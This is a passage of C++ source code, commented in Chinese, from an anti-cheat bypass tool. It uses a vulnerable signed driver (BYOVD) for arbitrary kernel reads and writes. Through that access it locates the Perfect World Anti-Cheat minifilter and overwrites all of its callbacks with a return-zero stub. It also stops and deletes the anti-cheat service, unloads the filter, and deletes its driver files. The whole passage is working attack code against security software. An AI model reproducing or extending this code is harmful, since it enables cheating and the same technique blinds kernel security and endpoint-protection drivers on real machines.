                    uint64_t checkAddr = val + (uint64_t)(checkIdx * 0x20); // sizeof(KernFltOpReg)=0x20
                    if (!kma.ReadKernelVA(checkAddr, &mj, sizeof(mj)) ||
                        (mj > 0x1B && mj != 0x80)) {
                        valid = false;
                        break;
                    }
                }
                if (valid) {
                    opsAddr = val;
                    uint8_t firstMJ = 0;
                    kma.ReadKernelVA(val, &firstMJ, sizeof(firstMJ));
                    ByovdDiag("FLT:NTRL: Operations at filter+0x%llX → 0x%llX (MJ=%u, 3-verified)\n",
                        off, (unsigned long long)opsAddr, (unsigned int)firstMJ);
                    break;
                }
            }
        }
    }

    if (!opsAddr) {
        ByovdDiag("FLT:NTRL: Operations pointer not found in FLT_FILTER\n");
        return false;
    }

    // 遍历 FLT_OPERATION_REGISTRATION 数组 (以 IRP_MJ_OPERATION_END=0x80 终结)
    int replaced = 0;
    int totalCallbacks = 0; // 非 NULL 回调总数

    for (int i = 0; i < 64; i++) {  // 最多 64 个操作注册
        KernFltOpReg reg = {};
        uint64_t regAddr = opsAddr + (uint64_t)(i * sizeof(KernFltOpReg));
        if (!kma.ReadKernelVA(regAddr, &reg, sizeof(reg)))
            break;

        if (reg.MajorFunction == 0x80) break;  // IRP_MJ_OPERATION_END

        // 统计非 NULL 回调
        if (reg.PreOperation)  totalCallbacks++;
        if (reg.PostOperation) totalCallbacks++;

        bool modified = false;

        // 替换 PreOp 回调
        if (reg.PreOperation != 0 && reg.PreOperation != stubAddr) {
            uint64_t preOpAddr = regAddr + offsetof(KernFltOpReg, PreOperation);
            if (kma.WriteKernelVA(preOpAddr, &stubAddr, sizeof(stubAddr))) {
                ByovdDiag("FLT:NTRL: [%d] MJ=0x%02X PreOp 0x%llX→stub\n",
                    i, (unsigned)reg.MajorFunction, (unsigned long long)reg.PreOperation);
                replaced++;
                modified = true;
            }
        } else if (reg.PreOperation == stubAddr) {
            replaced++; // 已经是 stub, 计入成功
        }

        // 替换 PostOp 回调 (可能为 NULL, 跳过)
        if (reg.PostOperation != 0 && reg.PostOperation != stubAddr) {
            uint64_t postOpAddr = regAddr + offsetof(KernFltOpReg, PostOperation);
            if (kma.WriteKernelVA(postOpAddr, &stubAddr, sizeof(stubAddr))) {
                ByovdDiag("FLT:NTRL: [%d] MJ=0x%02X PostOp 0x%llX→stub\n",
                    i, (unsigned)reg.MajorFunction, (unsigned long long)reg.PostOperation);
                replaced++;
                modified = true;
            }
        } else if (reg.PostOperation == stubAddr) {
            replaced++; // 已经是 stub, 计入成功
        }

        // 不修改 Flags (保留 FLTFL_OPERATION_REGISTRATION_SKIP_PAGING_IO 等标志)
    }

    // ★ v3.126n-review: 修复部分成功误报 — 只有全部回调都被 stub 替换才算成功
    bool allReplaced = (replaced >= totalCallbacks);
    ByovdDiag("FLT:NTRL: replaced %d/%d callback pointers → %s\n",
        replaced, totalCallbacks, allReplaced ? "ALL OK" : "PARTIAL FAIL");
    return allReplaced;
}

// === Public API ===

bool MinifilterNeutralizer::NeutralizeMessageTransfer() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        ByovdDiag("FLT:NTRL: Neutralize skipped — BYOVD not active\n");
        return false;
    }

    ByovdDiag("FLT:NTRL: === NEUTRALIZING MessageTransfer (keep alive) ===\n");

    uint64_t fltmgrBase = kma.GetKernelModuleBase("fltmgr.sys");
    if (!fltmgrBase) {
        ByovdDiag("FLT:NTRL: fltmgr.sys not loaded\n");
        return false;
    }
    ByovdDiag("FLT:NTRL: fltmgr.sys at 0x%llX\n", (unsigned long long)fltmgrBase);

    // 1. 定位 FltGlobals
    uint64_t fltGlobals = FindFltGlobals(fltmgrBase);
    if (!fltGlobals) return false;

    // 2. 查找 PAC minifilter
    // ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
    const wchar_t* pacName = GetPacTargetName();
    uint64_t filterAddr = FindFilterByName(fltmgrBase, fltGlobals, pacName);
    if (!filterAddr) {
        // ★ v3.126p: 精确匹配失败 → 尝试内核模糊扫描
        wchar_t kernName[256] = {};
        filterAddr = FindPacFilterInKernel(fltmgrBase, fltGlobals, kernName, 256);
        if (!filterAddr) {
            ByovdDiag("FLT:NTRL: no PAC filter found in kernel\n");
            return false;
        }
        pacName = kernName;
    }

    // 3. 中和回调
    if (!NeutralizeCallbacks(filterAddr)) return false;

    ByovdDiag("FLT:NTRL: === NEUTRALIZED SUCCESSFULLY ===\n");
    return true;
}

// ============================================================
// ★ BUILD 475: VerifyFltPipeline — 管道完整性验证
//
// 目标: 在不依赖 MessageTransfer.sys 的情况下, 100% 验证 FLT 管道可用性
//
// 验证步骤:
//   1. 找到 FltGlobals (sigscan + .data section scan fallback)
//   2. 找到 FrameList → FilterList (枚举链表头)
//   3. 遍历 FilterList, 枚举至少一个 FLT_FILTER 并读取其名称
//   4. 找到 ret0 stub 地址
//
// 如果以上全部通过, 则证明:
//   当 MessageTransfer.sys 被加载时, NeutralizeMessageTransfer() 必定能:
//     a) 在 FilterList 中找到它
//     b) 读取其 Operations 指针
//     c) 将所有回调替换为 ret0 stub
//
// 验证结果:
//   TRUE  = 管道完整, PAC minifilter 中和 100% 可行 (只要驱动加载)
//   FALSE = 管道有缺陷, 需要修复 (查看详细诊断日志)
// ============================================================
bool MinifilterNeutralizer::VerifyFltPipeline() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        ByovdDiag("FLT:VERIFY: SKIP — BYOVD not active\n");
        return false;
    }

    ByovdDiag("FLT:VERIFY: ========================================\n");
    ByovdDiag("FLT:VERIFY: PIPELINE INTEGRITY CHECK (BUILD 475)\n");
    ByovdDiag("FLT:VERIFY: ========================================\n");

    int checksPassed = 0;
    int checksTotal = 4;

    // === Check 1: fltmgr.sys loaded ===
    ByovdDiag("FLT:VERIFY: [1/%d] Checking fltmgr.sys...\n", checksTotal);
    uint64_t fltmgrBase = kma.GetKernelModuleBase("fltmgr.sys");
    if (!fltmgrBase) {
        ByovdDiag("FLT:VERIFY: FAIL — fltmgr.sys not loaded\n");
        ByovdDiag("FLT:VERIFY: RESULT: FAIL (0/%d checks)\n", checksTotal);
        return false;
    }
    checksPassed++;
    ByovdDiag("FLT:VERIFY: PASS — fltmgr.sys at 0x%llX\n", (unsigned long long)fltmgrBase);

    // === Check 2: FltGlobals found ===
    ByovdDiag("FLT:VERIFY: [2/%d] Finding FltGlobals...\n", checksTotal);
    uint64_t fltGlobals = FindFltGlobals(fltmgrBase);
    if (!fltGlobals) {
        ByovdDiag("FLT:VERIFY: FAIL — FltGlobals not found (both sigscan and .data scan failed)\n");
        ByovdDiag("FLT:VERIFY: RESULT: FAIL (%d/%d checks)\n", checksPassed, checksTotal);
        return false;
    }
    checksPassed++;
    ByovdDiag("FLT:VERIFY: PASS — FltGlobals at 0x%llX\n", (unsigned long long)fltGlobals);

    // === Check 3: 通过 FltGlobals 查找 FilterList 并枚举过滤器 ===
    // ★ BUILD 483: BUILD 482 的 .data pool pointer 全量扫描产生海量 IOCTL 导致蓝屏.
    //   改为: 优先使用已找到的 fltGlobals (与 FindFilterByName 同路径),
    //   该路径 IOCTL 读取极少 (<200 次). 仅当 FltGlobals 路径失败时,
    //   才启用量极小的 pool scan 作为后备.
    ByovdDiag("FLT:VERIFY: [3/%d] Finding FilterList via FltGlobals (BUILD 483)...\n", checksTotal);

    uint64_t bestListHead = 0;
    int bestFilterCount = 0;
    int bestQi = -1;
    uint64_t bestFilterListOff = 0;

    // ============================================================
    // FAST PATH: 使用 fltGlobals 的前 8 qword 寻找 FrameList → FilterList
    // ============================================================
    uint64_t globQw[8] = {};
    for (int i = 0; i < 8; i++) {
        kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
    }
    ByovdDiag("FLT:VERIFY: FltGlobals hex: %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX\n",
        (unsigned long long)globQw[0], (unsigned long long)globQw[1],
        (unsigned long long)globQw[2], (unsigned long long)globQw[3],
        (unsigned long long)globQw[4], (unsigned long long)globQw[5],
        (unsigned long long)globQw[6], (unsigned long long)globQw[7]);

    {
        // FilterList 偏移 (与 FindFilterByName 一致)
        static const uint64_t filterOffs[] = {
            0x138,0x140,0x148,0x150,0x158,0x160,0x168,0x170,0x178,0x180,
            0x188,0x190,0x198,0x1A0,0x1A8,0x1B0,0x1B8,0x1C0,0x1C8,0x1D0,
            0x1D8,0x1E0,0x1E8,0x1F0,0x1F8,0x200,0x208,0x210,0x218,0x220,
            0x228,0x230,0x238,0x240,0x248,0x250,0x258,0x260,0x268,0x270,
            0x278,0x280,0x288,0x290,0x298,0x2A0,0x2A8,0x2B0,0x2B8,0x2C0,
            0x2C8,0x2D0,0x2D8,0x2E0,0x2E8,0x2F0,0x2F8,0x300,
        };
        static const int fOffCount = sizeof(filterOffs) / sizeof(filterOffs[0]);

        // Name 偏移 (与 FindFilterByName 一致: 0x38..0x300)
        static const uint64_t nameOffs[] = {
            0x038,0x040,0x048,0x058,0x068,0x078,
            0x088,0x098,0x0A8,0x0B8,0x0C8,0x0D8,
            0x0E8,0x0F8,0x108,0x118,0x128,0x138,
            0x148,0x158,0x168,0x178,0x188,0x198,
            0x1A8,0x1B8,0x1C8,0x1D8,0x1E8,0x1F8,
            0x208,0x218,0x228,0x238,0x248,0x258,
            0x268,0x278,0x288,0x298,0x2A8,0x2B8,
            0x2C8,0x2D8,0x2E8,0x2F8,0x300,
        };
        static const int nOffCount = sizeof(nameOffs) / sizeof(nameOffs[0]);

        for (int qi = 0; qi < 8; qi++) {
            uint64_t frame = globQw[qi];
            if (frame < 0xFFFF800000000000ULL) continue;

            uint64_t firstQw = 0;
            if (!kma.ReadKernelVA(frame, &firstQw, 8)) continue;
            if (firstQw < 0xFFFF800000000000ULL) {
                ByovdDiag("FLT:VERIFY: globQw[%d]=%016llX rejected (data not kernel ptr)\n",
                    qi, (unsigned long long)frame);
                continue;
            }

            ByovdDiag("FLT:VERIFY: try globQw[%d]=%016llX as FrameList...\n",
                qi, (unsigned long long)frame);

            for (int fi = 0; fi < fOffCount; fi++) {
                uint64_t head = frame + filterOffs[fi];
                uint64_t flink = 0, blink = 0;
                if (!kma.ReadKernelVA(head, &flink, 8)) continue;
                if (!kma.ReadKernelVA(head + 8, &blink, 8)) continue;
                if (flink == head) continue; // 空链表
                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

                // ★ 找到活 FilterList → 枚举过滤器
                uint64_t cur = flink;
                int foundNamed = 0;

                for (int iter = 0; iter < 100 && cur && cur != head; iter++) {
                    uint64_t fBase = cur - 0x008; // ActiveLink 在 +0x008

                    for (int ni = 0; ni < nOffCount; ni++) {
                        uint16_t nl = 0; uint64_t nb = 0;
                        uint64_t uniAddr = fBase + nameOffs[ni];
                        if (kma.ReadKernelVA(uniAddr, &nl, sizeof(nl)) &&
                            kma.ReadKernelVA(uniAddr + 8, &nb, sizeof(nb))) {
                            if (nl > 0 && nl <= 256 && nl % 2 == 0 &&
                                nb > 0xFFFF800000000000ULL) {
                                // ★ BUILD 500: 固定数组替代 std::wstring — 避免 CRT 堆依赖
                                wchar_t fn[256] = {};
                                int fnChars = ReadKernelUnicodeString(nb, nl, fn, 256);
                                if (fnChars > 0) {
                                    foundNamed++;
                                    if (foundNamed == 1) {
                                        ByovdDiag("FLT:VERIFY: found '%ls' via globQw[%d]+0x%llX (nameOff=0x%llX)\n",
                                            fn, qi, filterOffs[fi], nameOffs[ni]);
                                    }
                                }
                            }
                        }
                        if (foundNamed > 0) goto NEXT_ENTRY_GLOB; // 找到 name 即可, 跳至下一个链表节点
                    }
                    NEXT_ENTRY_GLOB:
                    if (!kma.ReadKernelVA(cur, &cur, 8)) break;
                }

                if (foundNamed > 0) {
                    ByovdDiag("FLT:VERIFY: globQw[%d]+0x%llX: %d named filters\n",
                        qi, filterOffs[fi], foundNamed);
                    if (foundNamed > bestFilterCount) {
                        bestFilterCount = foundNamed;
                        bestListHead = head;
                        bestQi = qi;
                        bestFilterListOff = filterOffs[fi];
                    }
                }
            }

            if (bestFilterCount > 0) {
                ByovdDiag("FLT:VERIFY: FAST PATH SUCCESS — %d named filters via FltGlobals\n",
                    bestFilterCount);
                goto check3_done;
            }
        }
    }

    // ============================================================
    // ★ BUILD 495: 禁用 pool scan — PDFWKRNL IOCTL 0x80002014 无边界检查,
    //   解引用 .data 段中的野指针会直接触发内核页错误 → 蓝屏.
    //   FltGlobals 已找到 (Check 2 PASS), 但 FrameList 无法从 FltGlobals 解析,
    //   说明 Win11 24H2 FLT_FRAME 布局与已知模式不匹配.
    //   在找到安全的 Win11 FrameList 解析方法前, 不执行 pool scan.
    // ============================================================
    ByovdDiag("FLT:VERIFY: FltGlobals found but FrameList path failed — Win11 layout mismatch (BUILD 495)\n");
    ByovdDiag("FLT:VERIFY: pool scan DISABLED for safety (PDFWKRNL IOCTL causes BSOD on bad ptr)\n");

    if (bestFilterCount == 0) {
        // ★ BUILD 502: FrameList 失败 → 尝试字符串扫描系统 minifilter
        ByovdDiag("FLT:VERIFY: trying BUILD 502 string scan for system minifilters...\n");
        const wchar_t* testFilters[] = { L"FileInfo", L"WdFilter", L"Wof", L"luafv", nullptr };
        for (int ti = 0; testFilters[ti]; ti++) {
            uint64_t fAddr = FindFilterByStringScan(fltmgrBase, testFilters[ti]);
            if (fAddr) {
                ByovdDiag("FLT:VERIFY: BUILD 502 found '%ls' → FLT pipeline VERIFIED\n", testFilters[ti]);
                bestFilterCount = 1;
                bestListHead = fAddr + 0x008;
                bestQi = -1;
                bestFilterListOff = 0;
                goto check3_done;
            }
        }
        ByovdDiag("FLT:VERIFY: FAIL — no FILTER_LIST with named minifilters found\n");
        ByovdDiag("FLT:VERIFY: RESULT: FAIL (%d/%d checks)\n", checksPassed, checksTotal);
        return false;
    }

    check3_done:
    checksPassed++;
    ByovdDiag("FLT:VERIFY: PASS — FilterList via globQw[%d]+0x%llX (%d named filters)\n",
        bestQi, bestFilterListOff, bestFilterCount);

    // === Check 4: ret0 stub found ===
    ByovdDiag("FLT:VERIFY: [4/%d] Finding ret0 stub in fltmgr.sys...\n", checksTotal);
    uint64_t stubAddr = FindRet0Stub(fltmgrBase, 0x400000);
    if (!stubAddr) {
        ByovdDiag("FLT:VERIFY: FAIL — ret0 stub not found\n");
        ByovdDiag("FLT:VERIFY: RESULT: FAIL (%d/%d checks)\n", checksPassed, checksTotal);
        return false;
    }
    checksPassed++;
    ByovdDiag("FLT:VERIFY: PASS — ret0 stub at fltmgr+0x%llX\n",
        (unsigned long long)(stubAddr - fltmgrBase));

    // === FINAL VERDICT ===
    ByovdDiag("FLT:VERIFY: ========================================\n");
    ByovdDiag("FLT:VERIFY: RESULT: PASS (%d/%d checks)\n", checksPassed, checksTotal);
    ByovdDiag("FLT:VERIFY: === PIPELINE VERIFIED ===\n");
    ByovdDiag("FLT:VERIFY: | FltGlobals → FrameList → FilterList (%d filters) → ret0 stub |\n", bestFilterCount);
    ByovdDiag("FLT:VERIFY: | ⚠ UNTESTED — install PAC to verify neutralization works |\n");
    ByovdDiag("FLT:VERIFY: ========================================\n");

    return true;
}

bool MinifilterNeutralizer::IsMessageTransferNeutralized() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return true; // BYOVD 未激活时不报错

    // 检查 fltmgr FilterFindFirst 列表中的 minifilter 是否仍然是 stub
    // 简化为: 检查 fltmgr 内是否有非 stub 的 MessageTransfer 回调
    uint64_t fltmgrBase = kma.GetKernelModuleBase("fltmgr.sys");
    if (!fltmgrBase) return true;

    uint64_t fltGlobals = FindFltGlobals(fltmgrBase);
    if (!fltGlobals) return true; // 找不到 Globals 不报错

    uint64_t filterAddr = FindFilterByName(fltmgrBase, fltGlobals, GetPacTargetName());
    if (!filterAddr) {
        // ★ v3.126p: 精确匹配失败 → 模糊扫描
        wchar_t kernName[256] = {};
        filterAddr = FindPacFilterInKernel(fltmgrBase, fltGlobals, kernName, 256);
    }
    if (!filterAddr) {
        // minifilter 不在列表中 — 被卸载了, 需要重新安装假的存在性
        ByovdDiag("FLT:NTRL:Guard: PAC filter not found in FilterList!\n");
        return false;
    }

    // 检查 Operations 中的回调是否仍指向 stub
    uint64_t stubAddr = FindRet0Stub(fltmgrBase, 0x400000);
    if (!stubAddr) return true;

    uint64_t opsOffsets[] = { 0x2A8, 0x2B8, 0x2C8, 0x2A0, 0x2B0 };
    uint64_t opsAddr = 0;
    for (uint64_t off : opsOffsets) {
        if (kma.ReadKernelVA(filterAddr + off, &opsAddr, sizeof(opsAddr)) &&
            opsAddr > 0xFFFF800000000000ULL)
            break;
    }

    if (!opsAddr) return false;

    // ★ v3.126n-review: 修复 — 遍历全部条目到 MJ=0x80, 而非仅前 8 条
    for (int i = 0; i < 64; i++) {
        KernFltOpReg reg = {};
        if (!kma.ReadKernelVA(opsAddr + (uint64_t)(i * sizeof(reg)), &reg, sizeof(reg)))
            break;
        if (reg.MajorFunction == 0x80) break;
        if ((reg.PreOperation && reg.PreOperation != stubAddr) ||
            (reg.PostOperation && reg.PostOperation != stubAddr)) {
            ByovdDiag("FLT:NTRL:Guard: MJ=0x%02X PreOp=0x%llX PostOp=0x%llX not stub!\n",
                (unsigned)reg.MajorFunction,
                (unsigned long long)reg.PreOperation,
                (unsigned long long)reg.PostOperation);
            return false;
        }
    }

    return true; // 全部 stub → 已中和
}

// ============================================================
// ★ v3.126j: PAC (完美世界反作弊) 专用禁用模块
//
// PAC = Perfect Anti-Cheat, 完美世界自研反作弊系统
// 与 EAC 不同, PAC 使用 minifilter (MessageTransfer.sys) 而非 ObRegisterCallbacks
// 检测方式: 扫盘 (文件特征码) + 文件操作拦截 (minifilter) + 人工定罪
//
// 策略:
//   1. 停止 MessageTransfer 服务 (sc stop)
//   2. 卸载 minifilter (FilterUnload via fltlib.dll)
//   3. 删除注册表服务条目
//   4. 删除驱动文件 (完美平台plugin目录 + system32/drivers)
//   5. 周期性守卫 (GuardPac) 检查 PAC 是否恢复
//
// ★ v3.126p: PAC 改名容错 — 不依赖 "MessageTransfer" 硬编码
//   如果 PAC 更新改名 (如 v2.0 改成 "PvpAcFilter"), 自动通过关键词扫描发现
//   策略: 精确匹配 → 模糊扫描 → 最佳匹配
// ============================================================

// ★ v3.126p: PAC 相关关键词 — 用于模糊匹配 PAC 的 minifilter/服务/驱动名
static const wchar_t* g_pacPatterns[] = {
    L"messagetransfer",     // 当前已知名称 (2024-2026)
    L"pvpac",               // 常见变体 (PvP Anti-Cheat)
    L"pw_ac",               // PerfectWorld Anti-Cheat 缩写
    L"perfectworldac",      // 完整名称
    L"perfectworld",        // 完美世界
    L"pwanti",              // PerfectWorld Anti-*
    nullptr
};

// ★ v3.126q: 系统 minifilter 白名单 — 防止模糊匹配误伤 Windows 关键驱动
//   这些是 Windows 内置 minifilter, 永远不可能是 PAC, 匹配到就直接排除
static const wchar_t* g_systemMinifilterExclude[] = {
    L"wof", L"fileinfo", L"cldflt", L"dfsc", L"msfs", L"npfs",
    L"fltmgr", L"bfs", L"bindflt", L"wcifs", L"luafv",
    L"npsvctrig", L"storqosflt", L"iorate", L"fsdepends",
    nullptr
};

static bool IsPacPattern(const wchar_t* name) {
    if (!name || !name[0]) return false;

    // ★ v3.126q: 先检查系统白名单 — 排除 Windows 内置 minifilter
    for (int i = 0; g_systemMinifilterExclude[i]; i++) {
        if (_wcsicmp(name, g_systemMinifilterExclude[i]) == 0)
            return false;
    }

    // 模糊匹配 PAC 模式
    for (int i = 0; g_pacPatterns[i]; i++) {
        const wchar_t* p = name;
        while (*p) {
            const wchar_t* a = p, *b = g_pacPatterns[i];
            while (*a && *b && towlower(*a) == towlower(*b)) { a++; b++; }
            if (!*b) return true;
            p++;
        }
    }
    return false;
}

// ★ v3.126p: 统一 PAC 目标名获取 — 支持改名容错
// ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
static wchar_t g_cachedPacName[256] = {};
static DWORD   g_lastPacNameCheck = 0;

static const wchar_t* GetPacTargetName() {
    DWORD now = GetTickCount();
    if (g_cachedPacName[0] && now - g_lastPacNameCheck < 30000)
        return g_cachedPacName;
    g_lastPacNameCheck = now;

    // 枚举所有 minifilter, 找 PAC 匹配
    wchar_t found[256] = {};
    HMODULE hFltLib = LoadLibraryW(L"fltlib.dll");
    if (hFltLib) {
        auto pFF = (HRESULT(WINAPI*)(DWORD,LPVOID,DWORD,LPDWORD,LPVOID))GetProcAddress(hFltLib,"FilterFindFirst");
        auto pFN = (HRESULT(WINAPI*)(HANDLE,LPVOID,DWORD,LPDWORD))GetProcAddress(hFltLib,"FilterFindNext");
        auto pFC = (HRESULT(WINAPI*)(HANDLE))GetProcAddress(hFltLib,"FilterFindClose");
        if (pFF && pFN && pFC) {
            BYTE buf[1024]={}; HANDLE hF=nullptr; DWORD br=0;
            HRESULT hr = pFF(0,buf,sizeof(buf),&br,&hF);
            while (SUCCEEDED(hr)) {
                wchar_t* fn = (wchar_t*)(buf+8);
                if (IsPacPattern(fn)) { wcscpy_s(found, fn); break; }
                hr = pFN(hF,buf,sizeof(buf),&br);
            }
            if (hF) pFC(hF);
        }
        FreeLibrary(hFltLib);
    }
    if (!found[0]) wcscpy_s(found, L"MessageTransfer"); // 回退默认
    wcscpy_s(g_cachedPacName, found);
    return g_cachedPacName;
}

static void RefreshPacName() { g_cachedPacName[0] = 0; g_lastPacNameCheck=0; GetPacTargetName(); }

// ★ BUILD 497: 固定缓冲区替代 std::string — 避免 CRT 堆依赖
//   返回 outBuf 中实际写入的字节数
static int WStringToString(const wchar_t* ws, char* outBuf, int outBufSize) {
    if (!ws || !ws[0] || !outBuf || outBufSize <= 0) { if (outBuf) outBuf[0] = 0; return 0; }
    int len = WideCharToMultiByte(CP_ACP, 0, ws, -1, outBuf, outBufSize, nullptr, nullptr);
    if (len <= 0) { outBuf[0] = 0; return 0; }
    return len - 1; // 不包括 null terminator
}

// ★ v3.126p: 内核层模糊扫描 PAC minifilter (用于 Neutralize 失败后的回退)
// ★ BUILD 497: 固定数组替代 std::wstring& — 避免 CRT 堆依赖
static uint64_t FindPacFilterInKernel(uint64_t fltmgrBase, uint64_t fltGlobals, wchar_t* outName, int outNameChars) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t frameList = 0;
    if (!kma.ReadKernelVA(fltGlobals, &frameList, sizeof(frameList))) return 0;

    uint64_t filterOffsets[] = { 0x140, 0x148, 0x150, 0x138 };
    uint64_t filterListHead = 0;
    for (uint64_t off : filterOffsets) {
        uint64_t addr = frameList + off;
        uint64_t flink = 0, blink = 0;
        if (kma.ReadKernelVA(addr, &flink, sizeof(flink)) &&
            kma.ReadKernelVA(addr + 8, &blink, sizeof(blink))) {
            if (flink != addr && flink > 0xFFFF800000000000ULL && blink > 0xFFFF800000000000ULL) {
                filterListHead = addr;
                break;
            }
        }
    }
    if (!filterListHead) return 0;

    uint64_t nameOffsets[] = { 0x188, 0x198, 0x1A8, 0x178 };
    uint64_t current = 0;
    if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current))) return 0;

    for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
        uint64_t filterBase = current - 0x008;
        for (uint64_t nameOff : nameOffsets) {
            uint16_t nameLen = 0;
            uint64_t nameBuf = 0;
            if (kma.ReadKernelVA(filterBase + nameOff, &nameLen, sizeof(nameLen)) &&
                kma.ReadKernelVA(filterBase + nameOff + 8, &nameBuf, sizeof(nameBuf))) {
                if (nameLen > 0 && nameLen <= 256 && nameLen % 2 == 0 &&
                    nameBuf > 0xFFFF800000000000ULL) {
                    wchar_t filterName[256] = {};
                    int nchars = ReadKernelUnicodeString(nameBuf, nameLen, filterName, 256);
                    if (nchars > 0 && IsPacPattern(filterName)) {
                        if (outName && outNameChars > 0) {
                            wcsncpy_s(outName, outNameChars, filterName, (size_t)(outNameChars - 1));
                        }
                        return filterBase;
                    }
                }
            }
        }
        if (!kma.ReadKernelVA(current, &current, sizeof(current))) break;
    }
    return 0;
}

// 动态加载 fltlib.dll 的 FilterUnload 函数 (无需 WDK)
typedef HRESULT (WINAPI* _FilterUnload)(LPCWSTR lpFilterName);
// ★ v3.126l: FilterFindFirst/FilterFindNext — 枚举已加载 minifilter
typedef HRESULT (WINAPI* _FilterFindFirst)(
    DWORD dwInformationClass, LPVOID lpBuffer, DWORD dwBufferSize,
    LPDWORD lpBytesReturned, LPDWORD lpFilterFind);
typedef HRESULT (WINAPI* _FilterFindNext)(
    DWORD dwFilterFind, DWORD dwInformationClass, LPVOID lpBuffer,
    DWORD dwBufferSize, LPDWORD lpBytesReturned);
typedef HRESULT (WINAPI* _FilterFindClose)(DWORD dwFilterFind);

// ★ v3.126l: 检查 MessageTransfer minifilter 是否已加载
//   不依赖 SCM 服务状态, 直接查询 Filter Manager
static bool IsPacMinifilterLoaded() {
    HMODULE hFltLib = LoadLibraryW(L"fltlib.dll");
    if (!hFltLib) return false;

    _FilterFindFirst pFindFirst = (_FilterFindFirst)GetProcAddress(hFltLib, "FilterFindFirst");
    _FilterFindNext  pFindNext  = (_FilterFindNext)GetProcAddress(hFltLib, "FilterFindNext");
    _FilterFindClose pFindClose = (_FilterFindClose)GetProcAddress(hFltLib, "FilterFindClose");

    if (!pFindFirst || !pFindNext || !pFindClose) {
        FreeLibrary(hFltLib);
        return false;
    }

    // FILTER_FULL_INFORMATION = 0 (enumerates by filter name)
    wchar_t buf[512] = {};
    DWORD bytesReturned = 0;
    DWORD filterFind = 0;
    HRESULT hr = pFindFirst(0, buf, sizeof(buf), &bytesReturned, &filterFind);
    if (FAILED(hr)) {
        FreeLibrary(hFltLib);
        return false;
    }

    bool found = false;
    do {
        auto* info = (BYTE*)buf;
        // FILTER_FULL_INFORMATION: Name is at offset 8 (wchar_t[256])
        const wchar_t* filterName = (const wchar_t*)(info + 8);
        if (_wcsicmp(filterName, GetPacTargetName()) == 0) {
            found = true;
            break;
        }
        bytesReturned = 0;
        hr = pFindNext(filterFind, 0, buf, sizeof(buf), &bytesReturned);
    } while (SUCCEEDED(hr));

    pFindClose(filterFind);
    FreeLibrary(hFltLib);
    return found;
}

static bool DisablePacService() {
    ByovdDiag("PAC:DisablePacService: opening SCM...\n");

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        ByovdDiag("PAC: OpenSCManager failed (err=%u)\n", GetLastError());
        return false;
    }

    const wchar_t* pacName = GetPacTargetName();
    SC_HANDLE svc = OpenServiceW(scm, pacName,
        SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE | SERVICE_START);
    if (!svc) {
        ByovdDiag("PAC: SCM service '%ls' not found (may already be removed)\n", pacName);
        CloseServiceHandle(scm);
        return true; // 未找到 = 已经移除, 不算失败
    }

    // 查询状态
    SERVICE_STATUS_PROCESS ssp = {};
    DWORD bytesNeeded = 0;
    if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
        ByovdDiag("PAC: service state=%u\n", ssp.dwCurrentState);
        if (ssp.dwCurrentState == SERVICE_RUNNING) {
            // 发送停止命令
            SERVICE_STATUS stopStatus = {};
            if (ControlService(svc, SERVICE_CONTROL_STOP, &stopStatus)) {
                ByovdDiag("PAC: STOP signal sent\n");
                // 等待最多 3 秒
                for (int i = 0; i < 15; i++) {
                    Sleep(200);
                    QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded);
                    if (ssp.dwCurrentState == SERVICE_STOPPED) break;
                }
                ByovdDiag("PAC: final state=%u\n", ssp.dwCurrentState);
            } else {
                DWORD err = GetLastError();
                ByovdDiag("PAC: ControlService(STOP) failed (err=%u)\n", err);
                // 错误 1062 (服务未启动) 不算失败
                if (err != 1062) {
                    CloseServiceHandle(svc);
                    CloseServiceHandle(scm);
                    return false;
                }
            }
        }
    }

    // 删除服务
    if (DeleteService(svc)) {
        ByovdDiag("PAC: service deleted\n");
    } else {
        ByovdDiag("PAC: DeleteService failed (err=%u), service persists until reboot\n", GetLastError());
        // 确保服务已停止 (即使删除失败, 至少停用)
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return true;
}

static bool UnloadPacMinifilter() {
    // 动态加载 fltlib.dll → FilterUnload
    HMODULE hFltLib = LoadLibraryW(L"fltlib.dll");
    if (!hFltLib) {
        ByovdDiag("PAC: fltlib.dll not available\n");
        return false;
    }

    _FilterUnload pFilterUnload = (_FilterUnload)GetProcAddress(hFltLib, "FilterUnload");
    if (!pFilterUnload) {
        ByovdDiag("PAC: FilterUnload not exported\n");
        FreeLibrary(hFltLib);
        return false;
    }

    const wchar_t* pacName = GetPacTargetName();
    HRESULT hr = pFilterUnload(pacName);
    FreeLibrary(hFltLib);

    if (SUCCEEDED(hr)) {
        ByovdDiag("PAC: minifilter unloaded OK\n");
        return true;
    } else {
        // 0x801F0010 = 未找到过滤器 (可能已卸载)
        // 0x801F000F = 过滤器有活动实例但正在卸载
        ByovdDiag("PAC: FilterUnload returned 0x%08X (may already be unloaded)\n", (unsigned)hr);
        return (hr == 0x801F0010 || hr == 0x801F000F); // 不算失败
    }
}

static void DeletePacDriverFiles() {
    // 1. 完美平台 plugin 目录中的 MessageTransfer.sys
    //    路径: %ProgramFiles(x86)%\perfectworldarena*\plugin\MessageTransfer.sys
    //    或: %LocalAppData%\perfectworldarena*\plugin\MessageTransfer.sys
    wchar_t searchPaths[4][MAX_PATH] = {};
    int searchPathCount = 0;

    // Program Files 路径 (常见安装位置)
    wsprintfW(searchPaths[searchPathCount++], L"C:\\Program Files (x86)\\PerfectWorldArena");
